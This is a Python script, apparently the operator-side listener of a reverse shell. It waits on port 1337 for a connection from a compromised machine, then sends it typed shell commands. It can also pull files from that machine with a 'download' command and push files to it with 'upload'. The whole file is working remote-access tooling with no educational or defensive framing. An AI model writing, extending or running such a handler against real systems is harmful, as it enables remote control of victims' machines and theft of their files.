import socket, os, codecs, time

host = ""
port = 1337
datasize = 16384
path = "."

#Creating the socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
print("[*] Listening on 0.0.0.0:%s" % str(port))

s.listen(3)

connection, addr = s.accept()

print("[*] Connecting to %s:%s" % (str(addr[0]), str(addr[1])))

#Starting the endless loop
while True:
    cmd = input("[*] " + str(addr[0]) + " @ $: ")
    connection.send(str.encode(cmd))
    if cmd == "kill":
        break
    elif cmd[:8] == "download":
        with open(os.path.join(path,cmd[9:]), 'wb') as f:
            print("[*] File opened")
            while True:
                print("[*] Recieving data... ")
                data = connection.recv(1024)
                try:
                    z=data.decode("utf-8")
                    if data.decode("utf-8") == "Done":
                        print("[*] Done")
                        break
                    f.write(data)
                except:
                    f.write(data)
        f.close()
        print("[*] Succesfully downloaded the file and closed the connection.")

    elif cmd[:6] == "upload":
        print(os.path.join(path, cmd[7:]), 'rb')
        file = open(cmd[7:], 'rb')
        print("[*] Opened file")
        for line in file:
            connection.send(line)
            print("[*] Uploading File")
            time.sleep(0.05)
        file.close()
        time.sleep(2)
        connection.send(str.encode("Done"))
        print("[*] File has been sent")

        
    data = connection.recv(datasize)

    #Printing the received data, sometimes utf-8 doesnt work, sometimes cp1252 doesnt work.
    #If both dont work it will just print the undecoded text.
    try:
        print(data.decode("utf-8"))
    except:
        try:
            print(data.decode("cp1252"))
        except:
            try:
                print("[*] A problem occured when trying to decode the requested data. \n")
                print(data)
            except:
                print("[*] There is a problem with the requested data")

#Closing the connection aka. This will never happen    
connection.close()
